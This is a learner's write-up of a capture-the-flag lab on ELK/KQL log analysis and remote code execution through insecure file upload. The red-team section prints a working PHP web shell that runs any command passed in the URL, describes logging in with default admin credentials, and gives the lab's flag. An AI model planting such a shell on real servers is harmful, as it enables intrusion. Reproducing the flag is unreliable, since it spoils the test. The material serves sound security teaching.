# Day 3

## Learning Objectives
- Learn about Log analysis and tools like ELK.
- Learn about KQL and how it can be used to investigate logs using ELK.
- Learn about RCE (Remote Code Execution), and how this can be done via insecure file upload.

Our Challenge for this week is two-fold. We'll explore both the Red and Blue team side of things

## Using ELK

ELK stands for Elasticsearch, Logstash, and Kibana. These are three open-source tools that are commonly used together to collect, store, analyse, and visualise data.

KQL, or Kibana Query Language, is an easy-to-use language that can be used to search documents for values.

## Approach 

So I opened the website and went to the discover page and changed the collection to `wareville rails`

1. Changed the time to `0ct 1 2024 00:00:00:000 to Oct 2 2024 00:00:00:000`

We want to investigate the activity of `IP address 10.9.98.230` for that I set the filter on `clientip`

2. I saw that there were many `shell.PHP` programs which was suspicious. Then I used the query `message: shell.php` to search for all queries of containing shell.php

3. Now we get to the `Operation Red` side of things which analyzes the attack and how it was carried out.

**RCE(Remote Code Execution**: Uploading a script that the server runs gives the attacker control over it. Remote code execution (RCE) happens when an attacker finds a way to run their own code on a system. 


## Blue Side Approach

`Q1 : Where was the Web Shell uploaded to?`

So first I gave the query `message : shell.php` and checked that were 2 IP addresses using clientIP. There I saw that 1 IP address had hardly any activity so I ignored it and looked at the other one.

This IP(**10.11.83.34**) was actually running commands so it must be this one and it's filepath was `/media/images/rooms/shell.php`

## Red Side Approach

I opened nano and we want to edit the `hosts` file in the `etc` folder.

I pasted the website's address into it.

Okay so now I opened the website and logged in through the default attacker credentials `admin@frostypines.thm` and `password : admin`. 

Through this I was logged in as admin. I natigated to the Rooms page and clicked on `Add Room`

There we had an option to upload files. And I injected the given shell script(shell.php) into it.

``` php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="text" name="command" autofocus id="command" size="50">
<input type="submit" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['command'])) 
    {
        system($_GET['command'] . ' 2>&1'); 
    }
?>
</pre>
</body>
</html>
```

We know that our shell has been stored in `/media/images/rooms` through our Blue team approach. Now I opened that URL and found a input box.

Then I gave the  `ls command` and saw all the files in it. One of them was `flag.txt`. I used the  `cat command` on flag.txt to check it's contents.

From this I got the flag : `THM{Gl1tch_Was_H3r3}`

![alt text](./Images/Day3(1).png)




